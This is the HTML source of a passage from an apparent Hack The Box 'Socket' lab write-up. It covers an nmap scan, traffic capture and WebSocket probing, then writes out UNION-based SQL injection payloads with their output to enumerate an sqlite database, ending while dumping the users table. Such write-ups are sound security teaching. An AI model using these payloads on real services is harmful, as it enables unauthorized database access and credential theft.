+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Nmap 7.93 scan initiated Sat Mar 25 21:07:29 2023 as: nmap -sCV -p 22,80,5789 -oN nmap_initial.txt 10.10.11.206</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.206
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.043s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT     STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 4fe3a667a227f9118dc30ed773a02c28 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 816e78766b8aea7d1babd436b7f8ecc4 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp   open  http    Apache httpd 2.4.52
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://qreader.htb/
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">5789/tcp open  unknown
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GenericLines, GetRequest: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">400</span> Bad Request
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Wed, <span class="m">12</span> Jul <span class="m">2023</span> 19:34:47 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Server: Python/3.10 websockets/10.4
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">77</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/plain
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Failed to open a WebSocket connection: did not receive a valid HTTP request.
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   HTTPOptions, RTSPRequest: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">400</span> Bad Request
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Wed, <span class="m">12</span> Jul <span class="m">2023</span> 19:34:48 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Server: Python/3.10 websockets/10.4
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">77</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/plain
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Failed to open a WebSocket connection: did not receive a valid HTTP request.
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Help, SSLSessionReq: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     HTTP/1.1 <span class="m">400</span> Bad Request
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Date: Wed, <span class="m">12</span> Jul <span class="m">2023</span> 19:35:03 GMT
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Server: Python/3.10 websockets/10.4
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Length: <span class="m">77</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Content-Type: text/plain
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Connection: close
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Failed to open a WebSocket connection: did not receive a valid HTTP request.
+</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class="line"><span class="cl">SF-Port5789-TCP:V<span class="o">=</span>7.93%I<span class="o">=</span>7%D<span class="o">=</span>7/12%Time<span class="o">=</span>64AF3896%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>Ge
+</span></span><span class="line"><span class="cl">SF:nericLines,F4,<span class="s2">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\x20Wed,\x201
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:2\x20Jul\x202023\x2019:34:47\x20GMT\r\nServer:\x20Python/3\.10\x20webso
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ckets/10\.4\r\nContent-Length:\x2077\r\nContent-Type:\x20text/plain\r\n
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:Connection:\x20close\r\n\r\nFailed\x20to\x20open\x20a\x20WebSocket\x20c
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:onnection:\x20did\x20not\x20receive\x20a\x20valid\x20HTTP\x20request\.\
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:n&#34;</span><span class="o">)</span>%r<span class="o">(</span>GetRequest,F4,<span class="s2">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:\x20Wed
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:,\x2012\x20Jul\x202023\x2019:34:47\x20GMT\r\nServer:\x20Python/3\.10\x2
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0websockets/10\.4\r\nContent-Length:\x2077\r\nContent-Type:\x20text/pla
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:in\r\nConnection:\x20close\r\n\r\nFailed\x20to\x20open\x20a\x20WebSocke
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:t\x20connection:\x20did\x20not\x20receive\x20a\x20valid\x20HTTP\x20requ
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:est\.\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>HTTPOptions,F4,<span class="s2">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r\nDate:
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\x20Wed,\x2012\x20Jul\x202023\x2019:34:48\x20GMT\r\nServer:\x20Python/3
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\.10\x20websockets/10\.4\r\nContent-Length:\x2077\r\nContent-Type:\x20t
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ext/plain\r\nConnection:\x20close\r\n\r\nFailed\x20to\x20open\x20a\x20W
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ebSocket\x20connection:\x20did\x20not\x20receive\x20a\x20valid\x20HTTP\
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:x20request\.\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>RTSPRequest,F4,<span class="s2">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\nDate:\x20Wed,\x2012\x20Jul\x202023\x2019:34:48\x20GMT\r\nServer:\x20P
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ython/3\.10\x20websockets/10\.4\r\nContent-Length:\x2077\r\nContent-Typ
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:e:\x20text/plain\r\nConnection:\x20close\r\n\r\nFailed\x20to\x20open\x2
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0a\x20WebSocket\x20connection:\x20did\x20not\x20receive\x20a\x20valid\x
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:20HTTP\x20request\.\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>Help,F4,<span class="s2">&#34;HTTP/1\.1\x20400\x20Bad\x20Request\r
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\nDate:\x20Wed,\x2012\x20Jul\x202023\x2019:35:03\x20GMT\r\nServer:\x20P
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ython/3\.10\x20websockets/10\.4\r\nContent-Length:\x2077\r\nContent-Typ
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:e:\x20text/plain\r\nConnection:\x20close\r\n\r\nFailed\x20to\x20open\x2
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0a\x20WebSocket\x20connection:\x20did\x20not\x20receive\x20a\x20valid\x
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:20HTTP\x20request\.\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>SSLSessionReq,F4,<span class="s2">&#34;HTTP/1\.1\x20400\x20Bad\x20
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:Request\r\nDate:\x20Wed,\x2012\x20Jul\x202023\x2019:35:03\x20GMT\r\nSer
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ver:\x20Python/3\.10\x20websockets/10\.4\r\nContent-Length:\x2077\r\nCo
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ntent-Type:\x20text/plain\r\nConnection:\x20close\r\n\r\nFailed\x20to\x
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:20open\x20a\x20WebSocket\x20connection:\x20did\x20not\x20receive\x20a\x
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:20valid\x20HTTP\x20request\.\n&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">Service Info: Host: qreader.htb<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Sat Mar 25 21:07:29 2023 -- 1 IP address (1 host up) scanned in 92.72 seconds</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We can see from <code>Server: Python/3.10 websockets/10.4</code>, that this unusual port is an open web socket. We will come back to this later.</p>
+<h3 id="examining-the-webpage">Examining the webpage</h3>
+<p>Trying to visit the box&rsquo;s ip address as <code>10.10.11.206</code> redirects us to <code>qreader.htb</code>. To properly  visit the webpage that should be visible on port 80, we must add the address to our <code>/etc/hosts</code> file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ <span class="nb">echo</span> <span class="s2">&#34;10.10.11.206 qreader.htb&#34;</span> &gt;&gt; /etc/hosts
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now the website is viewable.</p>
+<p>We see the website advertised as a QR code reader:</p>
+<p><img src="/post/hackthebox-socket/images/QReader_page.png"
+	width="1448"
+	height="826"
+	srcset="/post/hackthebox-socket/images/QReader_page_hu943a511d4f8c6d32c755448ef4934824_73605_480x0_resize_box_3.png 480w, /post/hackthebox-socket/images/QReader_page_hu943a511d4f8c6d32c755448ef4934824_73605_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="QReader Page"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="175"
+		data-flex-basis="420px"
+	
+></p>
+<p>We can test it out within the browser, or they allow us to download an offline version further below. There are options for windows or linux versions. Being on linux, I will use this version for now and hope there is no significant difference between the two.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ file QReader_lin_v0.0.2.zip 
+</span></span><span class="line"><span class="cl">QReader_lin_v0.0.2.zip: Zip archive data, at least v1.0 to extract, compression <span class="nv">method</span><span class="o">=</span>store
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="analyzing-the-qr-code-reader">Analyzing the QR Code Reader</h3>
+<p>The zip contains an ELF binary for the QR code reader and a test.png to try it out</p>
+<p><img src="/post/hackthebox-socket/images/Reader_binary.png"
+	width="760"
+	height="410"
+	srcset="/post/hackthebox-socket/images/Reader_binary_hu4f100fe5e097ffd460bf3fd2dd93d0d4_20534_480x0_resize_box_3.png 480w, /post/hackthebox-socket/images/Reader_binary_hu4f100fe5e097ffd460bf3fd2dd93d0d4_20534_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="QR Code Reader"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="185"
+		data-flex-basis="444px"
+	
+></p>
+<p>After translating test.png it returns the box creator&rsquo;s username. Nice touch.
+Selecting the <code>about</code> tab, and trying to get info on either the version or updates will return this Connection error message. What could it be connecting to, perhaps our box&rsquo;s WebSocket port?
+Since the box itself is created and tested with static IP addresses, it isn&rsquo;t unreasonable to believe that when the box is moved to live environments with the hosting IP address constantly changing, that connection attempts like this one might fail.</p>
+<p>With the app open, I monitored the packet traffic data using <code>tcpdump</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">$ sudo tcpdump
+</span></span><span class="line"><span class="cl">tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
+</span></span><span class="line"><span class="cl">listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+</span></span><span class="line"><span class="cl">&lt;...SNIP...&gt;
+</span></span><span class="line"><span class="cl">20:04:21.317409 IP 10.0.2.15.53274 &gt; 108-166-149-2.client.mchsi.com.domain: 56266+ A? ws.qreader.htb. (32)
+</span></span><span class="line"><span class="cl">20:04:21.317495 IP 10.0.2.15.53274 &gt; 108-166-149-2.client.mchsi.com.domain: 57288+ AAAA? ws.qreader.htb. (32)
+</span></span><span class="line"><span class="cl">20:04:21.338657 IP 108-166-149-2.client.mchsi.com.domain &gt; 10.0.2.15.53274: 56266 NXDomain 0/1/0 (107)
+</span></span><span class="line"><span class="cl">20:04:21.338724 IP 108-166-149-2.client.mchsi.com.domain &gt; 10.0.2.15.53274: 57288 NXDomain 0/1/0 (107)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>When I query for updates, I see traffic pointing at <code>ws.qreader.htb</code></p>
+<p>I had hoped to see the data information being sent to the WebSocket, but for this case it was not necessary as the error responses were informative enough. I had heard the data can be retrieved through decompiling the binary file, but this is beyond my skill at the time.</p>
+<h3 id="examining-the-exposed-websocket">Examining the exposed WebSocket</h3>
+<p>Interacting with web sockets can be tricky. There are a variety of ways to do it, but I chose to utilize a <a class="link" href="https://addons.mozilla.org/en-US/firefox/addon/simple-websocket-client/"  target="_blank" rel="noopener"
+    >Simple WebSocket Client Plugin</a> for FireFox. Loading the page, we can input our url as <code>ws://10.10.11.206:5789</code></p>
+<p><img src="/post/hackthebox-socket/images/Websocket1.png"
+	width="1908"
+	height="520"
+	srcset="/post/hackthebox-socket/images/Websocket1_hu49f29f4a2e5d693352994377d29b1d3a_29509_480x0_resize_box_3.png 480w, /post/hackthebox-socket/images/Websocket1_hu49f29f4a2e5d693352994377d29b1d3a_29509_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="WebSocket Query 1"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="366"
+		data-flex-basis="880px"
+	
+></p>
+<p>Fortunately for us, it looks as though an improper input provides us with a small list of options on how we might interact. Since the output was JSON format, it is likely that the input must be JSON as well. After exploring for a bit, I find another response when probing <code>ws://10.10.11.206:5789/update</code></p>
+<p><img src="/post/hackthebox-socket/images/Websocket_Update.PNG"
+	width="907"
+	height="300"
+	srcset="/post/hackthebox-socket/images/Websocket_Update_hucc4befe3968ee7156f28a14fc18f7234_26602_480x0_resize_box_3.PNG 480w, /post/hackthebox-socket/images/Websocket_Update_hucc4befe3968ee7156f28a14fc18f7234_26602_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+		alt="/update"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="302"
+		data-flex-basis="725px"
+	
+></p>
+<p>It was a bit of a lucky hit that any version not <code>0.0.2</code> will return a message like this, otherwise it could be more difficult finding the version naming conventions in use. Now returning to /version, I check what happens when I input the older version <code>0.0.1</code>:</p>
+<p><img src="/post/hackthebox-socket/images/Websocket_version1.PNG"
+	width="991"
+	height="333"
+	srcset="/post/hackthebox-socket/images/Websocket_version1_hufa123f58b2c4b241132c2321e63beb46_39106_480x0_resize_box_3.PNG 480w, /post/hackthebox-socket/images/Websocket_version1_hufa123f58b2c4b241132c2321e63beb46_39106_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+		alt="WebSocket_versions"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="297"
+		data-flex-basis="714px"
+	
+></p>
+<p>There doesn&rsquo;t seem to be any extra information leaked through these queries. Upon closer inspection, however, we can eventually discover that these <code>/version</code> queries are SQL injectable.</p>
+<p><img src="/post/hackthebox-socket/images/Websocket_inject1.PNG"
+	width="835"
+	height="267"
+	srcset="/post/hackthebox-socket/images/Websocket_inject1_hu001485a827a99524f2113b36d1812ef0_28927_480x0_resize_box_3.PNG 480w, /post/hackthebox-socket/images/Websocket_inject1_hu001485a827a99524f2113b36d1812ef0_28927_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+		alt="Or 1=1&ndash;"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="312"
+		data-flex-basis="750px"
+	
+></p>
+<p>Note that despite supplying the invalid version, we still receive the confirmation of version <code>0.0.2</code>. From here, we should be able to leak the database information.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="manual-enumeration-with-sqli-union-injections">Manual enumeration with SQLi UNION injections</h3>
+<p>Eventually I find that the database is sqlite through the query <code>UNION SELECT sql from sqlite_master</code>:</p>
+<p><img src="/post/hackthebox-socket/images/Websocket_inject2.PNG"
+	width="1596"
+	height="251"
+	srcset="/post/hackthebox-socket/images/Websocket_inject2_huf614255f7f3938c4c0d999728058a335_36338_480x0_resize_box_3.PNG 480w, /post/hackthebox-socket/images/Websocket_inject2_huf614255f7f3938c4c0d999728058a335_36338_1024x0_resize_box_3.PNG 1024w"
+	loading="lazy"
+	
+		alt="UNION SELECT sql FROM sqlite_master"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="635"
+		data-flex-basis="1526px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-JSON" data-lang="JSON"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;version&#34;</span><span class="p">:</span><span class="s2">&#34;0.0.3\&#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;message&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;CREATE TABLE versions (id INTEGER PRIMARY KEY AUTOINCREMENT, version TEXT, released_date DATE, downloads INTEGER)&#34;</span><span class="p">,</span> <span class="nt">&#34;version&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span> <span class="nt">&#34;released_date&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span> <span class="nt">&#34;downloads&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Note that this type of sql injection often depends on having the same number of columns as the usual output. Since typically this websocket is expected to provide 4 columns (id, version, release_date and downloads), I supplement my union injection with 3 columns of NULL.</p>
+<p>This first output shows a table called <code>versions</code>, which is likely what we are already getting from non-injected queries. Dumping all tables might be slow this way, but we can do so by supplying <code>LIMIT</code> to our query:</p>
+<p><img src="/post/hackthebox-socket/images/Websocket_inject3.png"
+	width="759"
+	height="260"
+	srcset="/post/hackthebox-socket/images/Websocket_inject3_hu56f0f02b54550179a9611588c57fa0b4_29824_480x0_resize_box_3.png 480w, /post/hackthebox-socket/images/Websocket_inject3_hu56f0f02b54550179a9611588c57fa0b4_29824_1024x0_resize_box_3.png 1024w"
+	loading="lazy"
+	
+		alt="LIMIT 1"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="291"
+		data-flex-basis="700px"
+	
+></p>
+<p>Note that in this query I use <code>tbl_name</code>, so that the output isn&rsquo;t so long. Using <code>sql</code> provides us information on all column names from within the table, so it is useful to use once we find an interesting table. For a better word-wrapping experience, from this point on I put all outputs in code brackets</p>
+<p>After dumping all tables, we see a full picture that looks like this:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-JSON" data-lang="JSON"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;version&#34;</span><span class="p">:</span><span class="s2">&#34;0.0.3\&#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 1-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;message&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;CREATE TABLE answers (id INTEGER PRIMARY KEY AUTOINCREMENT, answered_by TEXT,  answer TEXT , answered_date DATE, status TEXT,FOREIGN KEY(id) REFERENCES reports(report_id))&#34;</span><span class="p">,</span> <span class="nt">&#34;version&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span> <span class="nt">&#34;released_date&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span> <span class="nt">&#34;downloads&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;version&#34;</span><span class="p">:</span><span class="s2">&#34;0.0.3\&#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 2-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;message&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;CREATE TABLE info (id INTEGER PRIMARY KEY AUTOINCREMENT, key TEXT, value TEXT)&#34;</span><span class="p">,</span> <span class="nt">&#34;version&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span> <span class="nt">&#34;released_date&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span> <span class="nt">&#34;downloads&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;version&#34;</span><span class="p">:</span><span class="s2">&#34;0.0.3\&#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 3-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;message&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;CREATE TABLE reports (id INTEGER PRIMARY KEY AUTOINCREMENT, reporter_name TEXT, subject TEXT, description TEXT, reported_date DATE)&#34;</span><span class="p">,</span> <span class="nt">&#34;version&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span> <span class="nt">&#34;released_date&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span> <span class="nt">&#34;downloads&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;version&#34;</span><span class="p">:</span><span class="s2">&#34;0.0.3\&#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 4-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;message&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;CREATE TABLE sqlite_sequence(name,seq)&#34;</span><span class="p">,</span> <span class="nt">&#34;version&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span> <span class="nt">&#34;released_date&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span> <span class="nt">&#34;downloads&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;version&#34;</span><span class="p">:</span><span class="s2">&#34;0.0.3\&#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 5-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;message&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password DATE, role TEXT)&#34;</span><span class="p">,</span> <span class="nt">&#34;version&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span> <span class="nt">&#34;released_date&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span> <span class="nt">&#34;downloads&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;version&#34;</span><span class="p">:</span><span class="s2">&#34;0.0.3\&#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master LIMIT 6-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;message&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;CREATE TABLE versions (id INTEGER PRIMARY KEY AUTOINCREMENT, version TEXT, released_date DATE, downloads INTEGER)&#34;</span><span class="p">,</span> <span class="nt">&#34;version&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span> <span class="nt">&#34;released_date&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span> <span class="nt">&#34;downloads&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>Users</code> database is a clear standout, and may contain valuable credentials:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-JSON" data-lang="JSON"><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;version&#34;</span><span class="p">:</span><span class="s2">&#34;0.0.3\&#34;UNION SELECT sql,NULL,NULL,NULL FROM sqlite_master-- -&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">{</span><span class="nt">&#34;message&#34;</span><span class="p">:</span> <span class="p">{</span><span class="nt">&#34;id&#34;</span><span class="p">:</span> <span class="s2">&#34;CREATE TABLE versions (id INTEGER PRIMARY KEY AUTOINCREMENT, version TEXT, released_date DATE, downloads INTEGER)&#34;</span><span class="p">,</span> <span class="nt">&#34;version&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span> <span class="nt">&#34;released_date&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span> <span class="nt">&#34;downloads&#34;</span><span class="p">:</span> <span class="kc">null</span><span class="p">}}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
